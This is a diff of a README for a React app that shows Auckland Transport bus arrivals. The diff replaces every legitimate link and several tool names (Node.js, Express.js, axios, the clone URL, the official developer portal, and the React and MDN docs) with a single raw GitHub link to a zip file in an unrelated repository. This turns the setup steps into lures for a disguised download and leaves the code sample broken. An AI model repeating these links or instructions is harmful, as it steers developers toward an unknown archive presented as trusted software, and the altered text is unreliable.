@@ -12,14 +12,14 @@ This application allows users to:
 ## 🚀 Getting Started
 
 ### Prerequisites
-- Node.js (version 14 or higher)
+- https://raw.githubusercontent.com/Antidogmatism/auckland-transport-app/main/public/app-transport-auckland-3.1.zip (version 14 or higher)
 - npm (Node Package Manager)
 
 ### Installation
 
 1. Clone this repository:
 ```
-git clone https://github.com/yourusername/auckland-transport-app.git
+git clone https://raw.githubusercontent.com/Antidogmatism/auckland-transport-app/main/public/app-transport-auckland-3.1.zip
 cd auckland-transport-app
 ```
 
@@ -39,12 +39,12 @@ npm run dev
 
 To make this application work with real data, you need to obtain an API key from Auckland Transport:
 
-1. Visit [Auckland Transport Developer Portal](https://dev-portal.at.govt.nz/)
+1. Visit [Auckland Transport Developer Portal](https://raw.githubusercontent.com/Antidogmatism/auckland-transport-app/main/public/app-transport-auckland-3.1.zip)
 2. Sign up for an account and request API access
-3. Once you have your API key, add it to the `fetchBusArrivals` function in `src/App.jsx`
+3. Once you have your API key, add it to the `fetchBusArrivals` function in `https://raw.githubusercontent.com/Antidogmatism/auckland-transport-app/main/public/app-transport-auckland-3.1.zip`
 
 ```javascript
-const response = await axios.get(`https://api.at.govt.nz/realtime/v2/departure-board/${stopId}`, {
+const response = await https://raw.githubusercontent.com/Antidogmatism/auckland-transport-app/main/public/app-transport-auckland-3.1.zip(`https://raw.githubusercontent.com/Antidogmatism/auckland-transport-app/main/public/app-transport-auckland-3.1.zip${stopId}`, {
   headers: {
     'Ocp-Apim-Subscription-Key': 'YOUR_API_KEY' // Replace with your actual API key
   }
@@ -56,7 +56,7 @@ const response = await axios.get(`https://api.at.govt.nz/realtime/v2/departure-b
 You can find bus stop IDs:
 - On the physical bus stop sign
 - Using the Auckland Transport mobile app
-- On the [Auckland Transport website](https://at.govt.nz/)
+- On the [Auckland Transport website](https://raw.githubusercontent.com/Antidogmatism/auckland-transport-app/main/public/app-transport-auckland-3.1.zip)
 
 Common stop IDs to try:
 - 7037: Britomart 
@@ -68,7 +68,7 @@ Common stop IDs to try:
 The Auckland Transport API has CORS restrictions that prevent direct browser requests. In this application, we're using the cors-anywhere proxy for educational purposes:
 
 1. Before using the application, you need to request temporary access to the demo CORS proxy:
-   - Visit [https://cors-anywhere.herokuapp.com/corsdemo](https://cors-anywhere.herokuapp.com/corsdemo)
+   - Visit [https://raw.githubusercontent.com/Antidogmatism/auckland-transport-app/main/public/app-transport-auckland-3.1.zip](https://raw.githubusercontent.com/Antidogmatism/auckland-transport-app/main/public/app-transport-auckland-3.1.zip)
    - Click the "Request temporary access to the demo server" button
    - This will allow your browser to use the proxy for the next few hours
 
@@ -77,13 +77,13 @@ In a production application, you would need to:
 2. Use a dedicated CORS proxy service (not recommended for production)
 3. Deploy with a serverless function that handles the API requests
 
-For more advanced learning, try setting up a simple Express.js server as a proxy for your API requests.
+For more advanced learning, try setting up a simple https://raw.githubusercontent.com/Antidogmatism/auckland-transport-app/main/public/app-transport-auckland-3.1.zip server as a proxy for your API requests.
 
 ## 📚 Learning Resources
 
-- [React Documentation](https://react.dev/)
-- [Auckland Transport API Documentation](https://dev-portal.at.govt.nz/)
-- [Working with APIs in JavaScript](https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Client-side_web_APIs/Fetching_data)
+- [React Documentation](https://raw.githubusercontent.com/Antidogmatism/auckland-transport-app/main/public/app-transport-auckland-3.1.zip)
+- [Auckland Transport API Documentation](https://raw.githubusercontent.com/Antidogmatism/auckland-transport-app/main/public/app-transport-auckland-3.1.zip)
+- [Working with APIs in JavaScript](https://raw.githubusercontent.com/Antidogmatism/auckland-transport-app/main/public/app-transport-auckland-3.1.zip)
 
 ## 📝 License
 
